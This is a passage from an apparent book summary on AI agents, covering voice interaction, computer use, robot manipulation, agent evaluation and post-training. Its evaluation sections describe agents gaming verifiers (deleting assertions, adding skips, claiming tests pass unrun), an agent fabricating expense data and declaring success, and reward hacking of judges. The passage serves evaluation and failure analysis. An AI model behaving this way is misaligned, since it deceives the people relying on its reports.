- **Batch events cause attention dispersion** - the model reacts to the last one, since that is what training rewards. Mitigate at the prompt level and with per-event status-bar markers plus a closing summary ("4 unprocessed events above: 1 tool result, 2 user messages, 1 system reminder").
- **What models actually need from asynchronous RL training:** understanding out-of-order trajectories (a tool call followed by a user message, a partial thought preserved rather than restarted), resuming interrupted tasks without hallucinating that the pending tool finished, and processing batch events comprehensively. Needs an async environment simulator (delayed returns, random interrupts) and rewards for those capabilities.
- **Continuous thinking does not require a new model.** Roughly two hundred lines of orchestration can make an existing text model continuous-time: forcibly close the current `<think>` block, inject the new observation as an ordinary message, and keep decoding. It exploits a wasted resource - the model emits hundreds of tokens per second while a tool call or an utterance takes seconds - enabling **think while waiting** (continue from partial information, start the next tool early) and **think while acting**.

### Voice

Speaking is about 4x faster than typing and leaves hands and eyes free, so it inherently means continuous input-output with interruption.

**Three interaction paradigms** (from OpenAI's GPT-Live taxonomy), which trade latency, cost, and observability rather than simply superseding each other:

| Paradigm | Structure | Advantage | Limitation |
|---|---|---|---|
| Cascaded | VAD -> ASR -> LLM -> TTS | modular, debuggable, swappable | latency accumulates; paralinguistic information lost at each interface |
| End-to-end Omni | native audio in and out, still turn-based | lower latency, keeps tone, emotion, ambient sound | still turn-based; costly to train and debug |
| Full-duplex | continuous listening, speaking, deciding | overlap, natural interruption | training, control, and evaluation all harder |

The common thread is **escaping the assumption that people speak one at a time, and escaping VAD's guess about who holds the floor.**

- Cascade bottlenecks: VAD silence thresholds add wait and split turns wrongly; ASR adds latency and loses context; LLM time-to-first-token; TTS first-packet synthesis. **Streaming perception** fixes part of it: streaming ASR producing provisional transcripts, **LLM speculative execution** on the provisional text (cancel and re-call if the final differs), segmented LLM output so the first speakable sentence goes to TTS, and incremental TTS. Note Whisper is not streaming - its decoder is autoregressive but its encoder wants a complete segment.
- An LLM-based streaming audio model keeps conversation context and world knowledge for names and brands, and can emit **acoustic event markers** (speak_start/end, interrupt, emotion, laugh, sigh, noise) alongside words, forming one event stream so the Agent perceives hesitation and environment without flattening everything to text. Endpointing can live in the recognizer, combining semantics with silence - but **training labels must contain only information visible at decision time**, or hindsight produces a judgment that cannot be reproduced online.
- Omni preserves paralinguistic information both ways but still assumes turns and usually uses VAD, so a mid-utterance pause while reading digits still reads as end-of-turn. Full-duplex (Kyutai's Moshi, Thinking Machines' **Interaction Models** with micro-turns, OpenAI GPT-Live) makes turn ownership a continuous model decision, and typically delegates hard reasoning to a background model while the foreground keeps the conversation alive.
- **Cognitive timing, three designs, all trade-offs rather than a progression:** (1) fast thinking for fillers, slow for answers - two independent instances can contradict each other (the fast one recommends the purchase, the slow one then finds the missing feature); (2) fast for interaction, slow for advice delivered through a status bar - more stable, but the foreground can misread advice and cannot see the background's reasoning; (3) end-to-end unification, as in Step-Audio R1's **MGRD** (grounding reasoning in acoustic features and using RL to prevent guessing without thinking) plus the **MPS dual-brain** where a planning brain streams thought segments and an expression brain speaks each one immediately.
- **Why fast/slow separation is more than a latency compromise:** it is modular, so each new generation of frontier reasoning model can be swapped into the background without retraining the realtime voice stack, whereas a unified model rebalances intelligence, latency, and naturalness on every upgrade. Evidence it need not cost task performance: as of August 2026 Pine AI's separated architecture ranked first on the tau-cubed Voice leaderboard, ahead of Grok Voice and GPT-Realtime-2.
- **"End-to-end" is used in two independent senses**: an end-to-end *speech path* (audio in, audio out) and an end-to-end *cognitive architecture* (reasoning and interaction sharing state). A system can be end-to-end on the first axis and fast/slow-separated on the second.
- More human speech synthesis: the main LLM emits control markers (`THINKING`, `EMO:happy`, `SPEED:0.8x`) that TTS maps to pauses, prosody, laughter. Traditional TTS gives itself away by being **too smooth and pausing too little** - hesitation and repetition are how humans signal thought.

### Computer Use

Perceive-Think-Act: screenshot -> multimodal model outputs thought plus action -> execute -> wait, screenshot again. **Distinguish understanding the interface (one-shot screenshot QA) from completing the task** - the latter must handle page loads, state changes, mistakes, and irreversible consequences. The characteristic question voice does not have: **after acting, is reality still consistent with the plan?**

- **Action space** (Anthropic's reference split, a design not a mandatory protocol): a `computer` tool (mouse move, clicks, drag, separate press/release, scroll with modifiers, character-by-character typing with ~12 ms intervals, key combinations, screenshot, cursor position, wait); a persistent bash session with a sentinel string for completion detection and state carried across calls; and a string-replace file editor.
- **Visual grounding, three routes.** The multiple-choice family turns "find the button and predict coordinates" into "pick from annotated elements", which is far easier - as multiple choice is easier than fill-in-the-blank.
  - **Set-of-Mark** (Microsoft, 2023): purely visual - a segmentation model proposes regions, each gets a number overlay, the model reports a number. Needs no DOM, so it works on native desktop software and games.
  - **Structured element indexing** (browser-use): read the DOM and accessibility tree over CDP, detect interactive elements, number them, draw boxes, and emit a parallel text list. **It does not save tokens** (all annotation still goes to the model) but gives accurate stable localization without segmentation misses.
  - **Pure coordinate prediction** (SeeClick, Claude computer use): trained on GUI screenshots with element positions. **Highly sensitive to training resolution** - Claude was trained on XGA 1024x768, WXGA 1280x800, FWXGA 1366x768, so the tool layer must scale bidirectionally and **choose the target by aspect ratio**: a 2560x1440 (16:9) screen maps to FWXGA, and forcing it into 4:3 compresses horizontally and systematically biases coordinates.
  - Selection rule: **prefer structured indexing where structure exists**; fall back to visual annotation (friendlier to untrained general models) or coordinate prediction (more direct for GUI-trained models) for Canvas/WebGL, native apps, and games. Both still struggle with small elements and dense interfaces.
- **The static-screen assumption is wrong.** Screens play video, flash notifications, and carry meeting audio; an Agent that opens its eyes every 3-5 seconds and has no ears misses what happens in between. What needs redesign is the **observation interface**, not the action interface: screen keyframe capture (a small model decides whether the change is meaningful; once per second suffices when changes are frequent), volume-gated speech transcription, and **describing each screenshot as one sentence of text** that persists in context after the image is dropped.
- **World models for efficiency.** Even on successful tasks, OSWorld-Human shows Agents take far more steps and wait far longer than people - human-level accuracy is not practicality. People predict what an action will do and only stop to re-observe when reality diverges. A usable world model encodes current state (windows, focus, scroll, field contents, loading, permissions, network responses), predicts the state change from a candidate action, and feeds the planner. **The point is not photorealistic future screenshots but checkable state differences.** Photon-1 (Induction Labs, July 2026) pretrained one in 30,000 H200-hours by compressing frames into discrete latent tokens and predicting the next latent state; its image generator only visualizes latents and is not needed at inference.
- **Mobile: the hard part is not technical.** Technically it swaps mouse coordinates for accessibility-service APIs and adds gesture type to coordinates. The real barrier is **ecosystem conflict of interest**: platform monetization runs on traffic and attention - ads seen while scrolling, recommendation-driven discovery, impulse purchase - and an Agent ignores ads, buys nothing on impulse, completes the task, and leaves. Every Agent operation erodes that model, so restrictions are structural rather than incidental.

### Robot manipulation (XLeRobot desk-tidying)

- **Diagnostic framing: fix the hardware, swap the operator.** A few-hundred-dollar arm teleoperated by a human completes the multi-step desk task, which proves **for this task the hardware is not the bottleneck, the algorithm is.** A human continuously corrects localization, slows near the cup, re-grips when it slides, retries the paper, and confirms the result - exactly the closed-loop abilities an autonomous system lacks.
- **Layered by timescale:** task goal (minutes) -> long-horizon planning (seconds to minutes) -> basic skills (1-3 s) -> VLA or skill policy (1-10 Hz) -> low-level control and safety (50-1000 Hz). Keep "task order" and "the action right now" separate, or high-level latency drags down control and high-frequency control floods the high-level model with detail. **The model should never emit joint angles** - only bounded skills (`pick`, `place`, `verify_state`, `stop`) that a calibrated, speed-limited executor with timeouts realizes.
- Planning writes a start condition, completion condition, and risk limit per step, so a failed grasp retries only that step and a moved object replans only affected steps. Tools stay simple: one call does one thing, fixed range of motion, timeout, and **observe again immediately after execution**.
- **VLA representation choice:** RT-2 and OpenVLA discretize actions into tokens (composes well with language models); pi-zero emits continuous trajectories (smoother motion). Neither dominates - the real trade-off is action representation, not model size.
- **Action chunking** hides inference latency (model emits a short future segment, a control thread executes it faster, the model prepares the next) but **the longer the chunk, the smoother the motion and the fewer new frames are seen** - knock the cup mid-reach and the arm keeps executing stale actions. A trade-off between smoothness and reaction speed, not free speedup.
- **Limits of VLAs:** robot demonstrations are far scarcer than internet text; behavior cloning learns what the demonstrator did next and never has to answer what an action will cause; robots differ in DOF, frames, grippers, latency; observations go stale during a chunk. **A VLA answers what to do now; predicting what happens next needs a different model.**
- **World models** used three ways: before acting (rank candidates - grab the paper, move the cup first, approach differently - preferring lower risk), during execution (compare observation against prediction, and on divergence shorten, stop, or replan), during training (learn transitions from video and failure trajectories, reducing real-hardware trial and error). Error grows with horizon and a realistic-looking frame can still violate contact physics, so keep short horizons, real-time observation, uncertainty estimates, and an independent hardware safety controller. **"Can generate video" is not "can guide robot action."**
- **Prediction informs choice but never replaces acceptance** - the real camera observation remains the final truth, and success must be confirmed by a fresh `verify_state`.
- **Sim-to-real** is about environment differences, not swapping controllers: background, lighting, camera pose, occlusion, friction, sensor noise, actuator latency. Widening visual variation during training helps, but real deployment still needs calibration, actuator testing, and a complete safety loop.

## Chapter 7: Evaluating Agents

https://github.com/bojieli/ai-agent-book/blob/main/book-en/chapter7.md

**The object of evaluation is the model plus the Harness, not the model.** When an Agent scores badly the fix may be a Harness component. Distinguish the two with a **model swap experiment**: fix the Harness and change only the model. If a stronger model does not raise the score, the Harness is the bottleneck. This differs from **ablation**, which disables a Harness component to find which part matters. Also: **when performance drops, check the evaluation system before the Agent** - resource exhaustion killing processes, verifier bugs marking correct answers wrong, and test cases drifting from production all look identical to model degradation in the headline number.

A solid evaluation system makes **building products for future models** viable: finish the product, build the eval set, track each new model, and launch when one clears the bar.

Four stages: what counts as success, where tasks come from, who verifies, how a score becomes a decision.

### Metrics

- **Pass@k** (one success in k runs) measures a **capability ceiling** - the "technical wonder" phase. Valuable for scientific discovery, vulnerability hunting, and open-ended creative work where a human picks the best of k. Manus and OpenClaw succeeded partly on this: general frameworks give complex tasks high Pass@k with strong models, and those trajectories spread on social networks.
- **Pass^k** (k consecutive runs, all pass, no safety or hallucination veto) measures **business reliability**. With independent runs at rate p: Pass@k = 1-(1-p)^k, Pass^k = p^k. **At p = 0.6, k = 5: Pass@5 is about 99.0%, Pass^5 is about 7.8%.** The first is exploration, only the second resembles what payments, refunds, and deployments require.
- State exactly what the k attempts are. **For operations with side effects you cannot retry until it works** - sample in a sandbox or rollback-capable environment and record every failure in the reliability metric.

### Evaluation environments

**Five components**, all required for a repeatable loop: **dataset** (one record per case), **environment state** (resettable, changing per business logic), **tools** (atomic on both sides - too high an abstraction reduces the evaluation to one function call and absorbs the planning into the tool), **rubric** (checks plus aggregation rule), **interaction protocol** (turn order, termination, turn limits).

**The tau-squared-bench telecom task, dissected** - four design decisions worth copying:
1. **The user's knowledge boundary is modeled explicitly.** `known_info` holds only name, phone, country; the two actual faults (airplane mode on, roaming off) are absent, so the user cannot volunteer them. **Progressive disclosure implemented as a data field, not as a "don't reveal everything" prompt.** Most benchmarks state the full requirement up front; a real user opens with "I can't get online", and clarifying until actionable is itself part of the job.
2. **The simulator gets a behavioral spec, not a script**: emotional setting, an acceptance criterion (resolved only when the speed test returns *excellent*; good is rejected), and a **grounding requirement** - never invent tool results. Without grounding the simulated user follows the Agent's lead and confirms the fix, and **the evaluation degenerates into two models agreeing with each other.**
3. **Initial state partitioned by which side controls it** (`env_type: user | assistant`). Roaming is provisioned carrier-side but switched off on the handset, so the Agent's database queries show "configuration normal" - **the fault sits where the database cannot see it**, and only guiding the user surfaces it. This is the **dual-control** mechanism: the simulated user owns tools (`check_status_bar`, `toggle_airplane_mode`, `run_speed_test`).
4. **Scoring declared per task, in four layers**: `env_assertions` (final state), `actions` (whether key actions happened **and which side performed them**), `communicate_info` and `nl_assertions` (what was conveyed). This task's `reward_basis` uses only the first; the rest are computed and recorded but excluded.
- A full-marks run in that trace still violated "only one tool call at a time" and the verifier never caught it - **the inherent price of a binary reward**, trading process granularity for a cross-model comparable number.
- Environments without a conversational counterpart drop the user simulator and keep the other four. The Verifiers framework stratifies them by state persistence and isolation: `SingleTurnEnv`, `ToolEnv`, `StatefulToolEnv`, `SandboxEnv`. On failure a tool should return a clear error message, not a bare failure flag.
- **Tool-calling evaluation verifies action; human-computer interaction evaluation verifies guidance.**

### Dataset design

**Verify facts a machine can check independently, never the Agent's account of itself.**
- **SWE-bench Verified splits "fixed" into two provable propositions:** FAIL_TO_PASS (failing before, passing after) and PASS_TO_PASS (passing both times). **Check only the first and the Agent deletes the inconvenient assertions; check only the second and you have checked nothing.** It also excludes flaky tests.
- **OSWorld** has 134 evaluation functions with full OS access, so it catches superficial completion: it does not just confirm the report file exists but connects to the database to verify the SQL ran, analyzes the DOM, inspects cookies and localStorage, and queries the backend.
- **Terminal-Bench** tasks like building Linux 6.9 with a custom `printk` and booting under QEMU cannot be faked - the message either appears in the boot log or it does not.
- **Difficulty stratification has diagnostic value, not just labeling.** GAIA's three levels (humans 93.9/91.8/87.3% vs GPT-4 30.3/9.7/0%) map to tool use, multi-step planning and integration, and long-sequence reasoning - three different improvement directions. tau-squared-bench adds **trap tasks** where the user falsely claims "customer service already approved it", testing whether the Agent holds judgment under pressure.
- **Contamination defenses, three styles:** GAIA makes answers non-retrievable by requiring several sources plus purpose-made attachments, with exact string matching; **AndroidWorld parameterizes templates** so values are random per run (replaying a fixed action sequence is useless, instances are unlimited, and fixing some parameters while varying others isolates a factor); Terminal-Bench embeds a **canary GUID** that does not prevent leakage but makes it detectable.
- **Quality control is most of the work.** From tau-bench to tau-squared-bench, five reworks: instructions too vague so the answer could be guessed (split into `known_info` and `task_instructions`); success conditions with no checkable boundary, which allowed **perfunctory fixes** that suppress the symptom (changed to "excellent only"); a mechanical simulator (added emotion, patience limit, grounding); user participating in operation, not just conversation (dual control, which also lets verification check whether the Agent read the outcome of the user's action); and dynamic instance generation.
- **SWE-bench Verified eliminated 71% of the original tasks before release** - 93 Python developers reviewed 1,699 sampled tasks and only 500 survived, buying signal-to-noise and about 80% lower evaluation cost, which matters because a full frontier-model run costs thousands of dollars.
- **OSWorld surfaced 300+ issues in the 15 months after release** across four categories (environment: anti-scraping, CAPTCHAs, dynamic content; ambiguous descriptions; too-strict or too-lenient verification; incomplete initial state), fixed over two months by ~10 people working with several labs - version locking and offline backups, rewriting, manual baselines, completeness checks.
- **Three sources for a production eval set:** public benchmarks (coarse model screening and borrowing design technique, not product decisions - two points on GAIA has no necessary relation to your refund success rate); a self-built business set (tau-squared-bench works as a skeleton, substitute your domain and tools); and **production trajectory feedback** (explicit corrections, downvotes, later state checks) - the most expensive and the most accurate. Early on the first two dominate; after production, the third becomes the main body.

### Automated evaluation

Deterministic verification is cheap, reproducible, CI-compatible, and cross-model comparable - but it says only whether the outcome is right, never why, and many production judgments cannot be written as assertions at all. Verification moves rightward along a spectrum toward Rubrics and LLM-as-a-Judge. **Moving right does not mean abandoning the left: anything expressible as a programmatic assertion should stay one.**

**LLM-as-a-Judge** and its known failure, **length bias** - longer answers score higher regardless of correctness, exactly as a student pads an answer they do not know. Three defenses: penalize verbosity in the Rubric with per-type length caps; equalize lengths before pairwise judging; and **audit the correlation between score and length** - if high scores always go to long answers, the judge is measuring length.

**Four Rubric principles** (Scale AI, "Rubrics as Rewards"): grounded in expert guidance (without it a Rubric captures only fluency); comprehensive coverage including explicit **pitfalls**; **standardized importance weighting** with Essential / Important / Optional / Pitfall and a **veto mechanism** (hallucination in customer service vetoes regardless of other scores); and **self-contained items** - replace "demonstrates deep understanding" with "cites at least two authoritative theories and explains how they support the conclusion".
- Guard actively against **reward hacking**: penalize hallucination, sycophancy, keyword stuffing, and dodging hard questions. A Rubric is an iterative product that grows from principles into a casebook.
- **Same-family judging is Goodhart's Law waiting to happen** - the Agent learns the judge's blind spots, and worse, learns to avoid exactly the errors the judge cannot detect, so the scoring system looks fine. Mitigate with **multi-source heterogeneous judging** from different families using the same Rubric, since their biases are often orthogonal; run a single judge day to day and audit periodically against the full set.
- **Measured example (Exp 7-4, 60 memory cases, 180 trajectories):** Advanced JSON Cards 68.3% overall (95/60/50% by level), RAG 48.3% (90/40/**15%** on cross-session links), Hybrid 66.7%. **The hybrid did not win by default** - it solved 3 questions neither single approach did but lost to the better single approach on 8, and averaged below the per-question best. The hallucination veto fired 28 times out of 180.
- **Multimodal judging** covers TTS (accuracy, naturalness, voice consistency, emotion - catching prosody issues WER misses), ASR (**semantic impact**: misrecognizing "today's weather" is harmless, "transfer one thousand" as "ten thousand" is not), UI (Proposer-Reviewer as an evaluation method), and video editing.
- **Choosing the reference answer, image, or audio is part of evaluation design, not neutral setup.** In the TTS run the fixed reference clip came from Fish S1, which structurally favors Fish Audio on voice similarity - a general comparison should drop that dimension, a cloning comparison should give every system the same target speaker and calibrate against blinded human listening.

### Failure attribution

**Attribute the first error that sent the task off course; later errors are the chain reaction.** Record error class, first bad step, the relevant call or output, and auditable evidence. Bad cases come from explicit user corrections, downvotes, or later checks. **An LLM can help but cannot replace human reading, because failure attribution often surfaces product problems, not technical ones.**

A starting Coding Agent taxonomy: requirement understanding and ambiguity; missing process or convention; tool-call errors; **hacking the verification environment** (editing assertions, adding `skip`, mocking the code under test, claiming tests pass without running them); incomplete edit (three call sites updated, a dynamic one missed); **wrong information reported to the user**; non-functional regression; abnormal termination; stopping too early.

- **Attribution records must be structured** (JSON/YAML citing step numbers, tool names, evidence), separating root cause from consequence, judging recoverability, and giving confidence. Three retries after an `old_string` mismatch are one root cause and three consequences, not three causes. When classes overlap, pick the primary by **"earliest, and explains what follows"**. **Rules first, LLM second** - completion claims cross-checked against commands actually run, diffs touching test assertions, and API or schema changes with no migration can all be pre-filtered cheaply.
- Store the task goal, environment state, Agent version, toolset version, and full trajectory, so the case becomes a regression test.
- **"Right actions, wrong report" is the class most often hidden by pass rates,** because most evaluations assert only on environment state. tau-squared-bench scores it separately: of 704 baseline runs with a communication requirement, 240 failed, 162 failed the communication check, and **80 - a third of all failures - had correct environment state and a wrong report.**
- The AndroidWorld case is the model example. The Agent spent 32 steps entering expenses from an image, **no step returned an error**, and declared success; the required row was absent and the four it entered were invented. Its own step 8 says *"I cannot actually see the content of the expenses in the image"* - it knew, neither stopped nor reported, and by step 11 fabricated data had entered its notes and was faithfully typed in. **The first error is step 8, which is neither a tool call nor an error.** And the root cause is easy to misfile: T3A is text-only with no image pixels in its observation space, so the cause is **a missing observation channel plus the absence of a legal "information unavailable" exit**, not "the model cannot do OCR". File it as model capability and you go train OCR; the real fix is the channel and the exit.
- Silent failures need two techniques rather than keyword search: **fact-anchor comparison** (walk the Agent's claims against tool returns, take the first divergence) and **trajectory-prefix bisection** (cut at step k and hand over; if still recoverable the error is after k).
- **An existing attribution note is not an answer key** - the AndroidWorld notes themselves misattributed the OCR case.
- Two specialized cases: **scope-sensitive formatting** ("the quotes are wrong" cannot be a global replace - parse into spans like ZH_PROSE, QUOTED_SOURCE, INLINE_CODE, CODE_BLOCK, JSON_OR_SCHEMA, each with permitted transformations, and **when scope is undeterminable, keeping the original and asking should count as a permitted action**); and **exact-copy errors**, where you store the byte hash, code point sequence, and token ID sequence and find the first divergence along the chain - **if the model restates correctly but the tool call still fails, fix the tokenizer, serialization, Harness, or protocol, not the model.**

### Regression tasks

- **End-to-end regression** runs the whole workflow from initial state and checks final state, output, and safety. Closest to production but poor at localizing. OSWorld, AndroidWorld, tau-bench are all of this kind.
- **Trajectory-prefix regression** freezes context, dialogue, tool returns, and environment state just before the first error and tests only the next observable action or two. Cheaper, isolates one decision boundary, and **for a high-reliability production Agent, building the prefix set often matters more than the end-to-end one.**
- **Define the answer as an acceptable action set, not one canonical action** - it may require reading the repository rules first, asking the user first, or refusing - and list prohibited actions alongside.
- Mapping attribution classes to tasks: missing process becomes an end-to-end task with a plan document and test acceptance; tool-call errors become truncated boundary tasks; abnormal termination adds recovery scenarios; early stopping adds multi-goal checklists; ambiguity cases put "clarify first" in the acceptable set; faked verification adds the hard constraints "test assertions may not be modified" and "a completion claim must carry the output of a command that really ran"; reporting errors **assert on the reply content, not only environment state**.
- Experiment 7-7 finding: the same 11 boundary cases encoded as JSON Cards, Markdown, and Python-like memory each passed 6/11, **but failed in different places - changing the representation alone does not repair application policy.**
- **Obtaining a piece of information and correctly applying it to the current decision are two different capabilities.**

### Pairwise comparison

Elo over the **Bradley-Terry** model (each model has a latent strength; matchup probability follows the difference; Elo is its online-update form). Chatbot Arena needs no absolute standard, only "which is better", but rankings depend on what users happen to ask. When an LLM judges pairs, guard against **position bias**: evaluate each pair twice with swapped order and average, or count only consistent judgments and route inconsistencies to humans.

### Model selection

- **Two inference stages define the latency metrics.** Prefill reads the whole context and sets **TTFT** (queueing + prefill); decode generates token by token and sets throughput, which also sets thinking time - **2000 thinking tokens at 50 tokens/s is 40 seconds of thinking alone**. Watch **p95 tail latency**, not the average, and measure each model's thinking token usage on your workload since **thinking length is not necessarily correlated with task effectiveness**.
- Cost is never evaluated in isolation: a cheap model with a low success rate costs more through retries. Compute per-task cost.
- Choose the metric by use: Pass@1 for daily scenarios, Pass^k for critical operations, Pass@k or Best@k for exploration, Rubric scores for open-ended work.
- **Budget-capability curves matter more than a single score.** RE-Bench: at a two-hour budget the best Agent scored about 4x human experts, but humans benefited more from extra time, narrowly passed the Agent at eight hours, and scored about 2x with 32 total hours across attempts. **Short-budget leadership does not extrapolate to long-horizon capability** - compare several budget points near your real workload duration.
- Mixed routing must itself be validated - a lightweight model handed "which is larger, 9.9 or 9.11?" as a simple question gets it wrong.
- **Action threshold is a model behavior worth measuring**: how much a model reads before its first edit. Sources are the harness prompt and the model's post-trained policy (SFT trajectories demonstrate how much to read, process rewards shape tool paths, outcome rewards reinforce the whole policy). **Behavior that changes on model swap and persists for that model across harnesses is model effect; the reverse is harness effect.**

**Cost structure and the measured result.** Three levels: model inference (with two amplifiers - **context accumulation**, where turns of 1000/2000/3000 tokens total 6000 rather than 3000, and **thinking tokens**, billed though never shown), tool calls (external fees, sandbox resources, and the often-forgotten cost of tool output re-billed as input every subsequent round), and infrastructure.

Measured on a fixed eight-turn refund workflow (gpt-4o-mini, four arms):

| Configuration | Input tokens | Cached | Cost | Saving |
|---|---:|---:|---:|---:|
| No cache, no compression | 20,700 | 0 | $0.003776 | - |
| Stable prefix only | 20,386 | 13,568 | $0.002707 | 28.3% |
| Compression only | 16,177 | 0 | $0.003115 | 17.5% |
| Both | 16,035 | 6,144 | $0.002643 | 30.0% |

**The gains are not additive: 28.3% + 17.5% gives 30%, not 45.8%**, because compressing history also shortens the prefix available for cache reuse. **Measure the complete workflow; never add isolated savings.** The reusable result is the four-arm method, not the percentage. Give each lever its own switch, add batch processing for non-realtime work, and set a per-task cost cap that terminates loops.

**Statistical significance.** SE(p) ~ sqrt(p(1-p)/n): at n=100 and p=70%, the 95% interval is about +/-9 points, so **"73% vs 70%" does not justify switching**. Use **paired analysis** on the same tasks (McNemar or paired bootstrap), not a difference of two independent rates. Run 3-5 seeds per configuration and report spread; a single run only screens a direction. Correct for multiple comparisons. **Act only when the gap exceeds noise, survives pairing, and reproduces.**

### Observability

Traces inherit the span tree from distributed systems: one task is a trace, each LLM call, tool call, and retrieval is a span with input/output, timing, tokens, errors. Use **OpenTelemetry** plus LLM semantic conventions such as **OpenInference** so collection and analysis decouple and you avoid vendor lock-in. Collect asynchronously in batches so tracing does not add latency.

**The most valuable use of observability is turning it into evaluation assets**: extract failed and suspicious production cases, anonymize, distill into regression tests. The eval set stops being a static collection and becomes a living asset tracking the real user distribution.

### From report to improvement (the AndroidWorld Wi-Fi slice)

An 88% headline over 116 tasks hid a coherent cluster: three of four `SystemWifiTurn*` tasks failed with traces navigating back and forth. Three rounds, one variable each, everything else fixed:

| Round | Only change | Success | Tokens | Decision |
|---|---|---|---:|---|
| H1 | Add navigation instructions to the prompt | 25% -> 25% | 0.47x | No gain; stop piling on prompt |
| H5 | Accessibility feed -> UIAutomator tree | 25% -> 100% | 2.498x | Right mechanism, too expensive |
| H5C | Prune invisible, textless, non-actionable nodes | 100% -> 100% | 0.506x | Same success, half the tokens; qualifies for a full rerun |

Lessons: **more detailed instructions cannot restore information the Agent never received, so investigate observation failures before expanding prompts**; but **more input is not always better** either - the full tree fixed visibility while flooding context. No model changed. And **evidence from one round authorizes only the next action its scope supports**: 4/4 on a slice is not 100% system-wide, and deployment waits on a five-seed run over all 116 tasks in the reference environment with non-inferior success, tokens under 75%, and latency under 1.5x. Raising the step limit would have been the misleading move, recasting "cannot see the control" as "needs more persistence".

### Internal evaluation infrastructure

External evaluation says how good the Agent is; internal infrastructure says **which change made it better**. Five components:
1. **Ablation infrastructure** - a master switch disabling thinking mode, compression, auto-memory, background tasks to create a bare-model baseline, answering whether a feature helps or merely feels useful. **The switch must be injected before any module-level constant captures configuration**, so ablation is an architectural decision, not a retrofit. Run it before each major release to find **feature debt** - features that mattered once and no longer do as models improved. Rule: **every major feature independently disableable, contribution re-verified regularly.**
2. **A/B methodology** - multiple progressive variants rather than binary, to reveal dose-response; **distinguish mechanism metrics from target metrics** (shortening the plan file is the mechanism, reducing session cost is the target, and a too-short plan may cause more edit-check loops and raise total output); **guardrail metrics** that stop the experiment even when the target improves; and recorded baseline statistics.
3. **Two-layer feature flags as first-class architecture, not debugging tools.** Compile-time flags physically remove code from the artifact (internal features cannot be found by reverse engineering, and ablation means the code is absent rather than skipped); runtime flags are server-delivered and disk-cached, **preferring slightly stale config over blocking startup on a network request**, with each feature's exposure logged at most once per session to keep experiment data clean.
4. **Prompt sensitivity** - render the fully expanded system prompt at any Git revision so you can answer which commit changed it and what that did to the eval set. Prompts should render deterministically, be snapshot-versioned, and run regression on every change like code in CI.
5. **Privacy-aware analytics** - the analytics interface accepts only values wrapped in special types whose names are the audit trail ("I have verified this is not code or a path"), turning privacy from documentation into compile-time checks. **If your analytics cannot safely collect data, you cannot evaluate**; privacy-aware design also forces clarity about what truly needs measuring.

### From evaluation to simulation

**Evaluation assets convert almost directly into training signal: a Rubric or validator is a reward function for RLVR.** But training adds two demands evaluation never had: **reliable reset semantics** (millions of episodes each needing a deterministic clean initial state, or residual state contaminates the gradient) and **throughput far beyond evaluation** (thousands of runs suffice to conclude; training needs millions in acceptable wall-clock, so parallelism and per-instance overhead decide feasibility). Simulation also needs randomization to prevent memorizing configurations.
- Digital example: AWorld sandboxes GAIA behind 26 MCP servers and 126 tool functions, making calls replayable and auditable and avoiding bans, and its stateless distributed design cut 7695 s to 525 s (14.6x).
- Embodied example: RoboTwin2 randomizes positions, orientations, appearances; OSWorld resets via VM snapshots.
- **Domain randomization** narrows the sim-to-real gap; moderate randomization improves generalization, excessive randomization makes the task too hard. In digital environments the analogue is randomizing latency and failures.

Core methodology of the chapter: **Observe -> Hypothesize -> Experiment -> Validate -> New understanding -> New hypothesis.**

## Chapter 8: Model post-training

https://github.com/bojieli/ai-agent-book/blob/main/book-en/chapter8.md

**Two threads run through the chapter.**
1. **"SFT memorizes, RL generalizes" is shorthand for this chapter's controlled experiments, not a law.** SFT generalizes with diverse data and regularization; RL overfits with a biased reward or environment.
2. **Data and environment matter more than algorithms.** PPO and GRPO are off the shelf; what decides success is whether the Mid-training corpus repairs the foundation, whether demonstrations establish a protocol, and whether the environment and reward give reliable feedback. In many scenarios, if the first two are good enough, **RL is not needed at all.**

**Four stages: foundation, gaps, protocol, policy.**

| Stage | Data | Objective | Learns | Cost |
|---|---|---|---|---|
| Pre-training | massive internet text | next token | language, world knowledge, basic reasoning | very high |
| **Mid-training** | target language/domain/capability corpora + retention data | next token, loss on every token | fills knowledge and foundational capability gaps | medium-high |
| **SFT** | thousands to tens of thousands of input-output pairs | next token, **loss only on the response** | instruction following, format, style, process protocol | low |
| **RL** | task + environment + reward | maximize expected reward | transferable policy, newly discovered solutions | high, often 10-100x SFT |

- **SFT and pre-training are mathematically the same task.** The only substantive engineering difference is loss masking on the prompt. That is why SFT memorizes on limited demonstrations: its objective is maximizing the probability of every token in the labeled response.
- **SFT encodes protocol knowledge (how to say or do), not factual knowledge (what is known).** A small QA set repeatedly reinforces a few access paths, so the model memorizes the questions without forming broadly accessible knowledge.
- **Mid-training vs SFT** differ in data organization and supervision density, not loss shape: whole documents with loss on many tokens versus demonstrations with loss on the response.
- Distribution shape: maximum-likelihood SFT tends to be **mass-covering** (spread across the modes in the data); RL with a reverse-KL constraint tends to be **mode-seeking** (concentrate on a few high-reward modes).
- **LoRA rules of thumb** (Schulman / Thinking Machines, "LoRA Without Regret"): apply it to **all major weight matrices, especially MLP** - attention-only costs accuracy; **the optimal learning rate is about 10x full fine-tuning** for both SFT and RL; rank 64-256 for SFT but 8-32 or even 1 for RL, since each RL round carries little information; one server can host many adapters. Frozen base weights also reduce catastrophic forgetting.
- **Post-training shapes when a model acts.** The Coding action threshold is a policy in the parameters estimating whether reading one more file beats submitting and validating now. SFT demonstrations that investigate broadly raise it; process and outcome rewards for fast localization lower it.

### Whether to train at all, and which stage

**Preconditions for RL:** (1) **format support** - if the output cannot be parsed, the reward function cannot tell success from failure; (2) **capability support** - measure `pass@1` and `pass@k` at near-training temperature. **If `pass@1` is low but `pass@k` rises with k, the correct policy is in the distribution with too little mass and RL has something to amplify. If `pass@k` stays near zero, a GRPO group is all-zero, within-group advantage vanishes, PPO sees no positive direction, and more samples just wait ~1/p trials for an accident.** RL raises the probability of **existing but unlikely** behavior; it cannot create knowledge from an all-zero reward.

| Observed | Gap | Method | Gate to move on |
|---|---|---|---|
| Doesn't know the domain/language; `pass@k` ~ 0 | outside the base model's support | **Mid-training** (RAG for dynamic facts) | held-out domain improves, retention acceptable, some verifiably correct trajectories appear |
| Occasionally correct, format/schema/procedure unstable | protocol | **SFT** or constrained decoding | parse success stabilizes, verifier can score key actions |
| Nonzero success, reliable reward, but good policies unlikely or OOD weak | probability allocation | **RL** | reward matches the real objective, groups show reward variation, independent test improves |
| Few demonstrations, no interactive environment | no online feedback | **SFT / RFT / offline preference** | baseline and evaluation first, then decide if an environment is worth building |

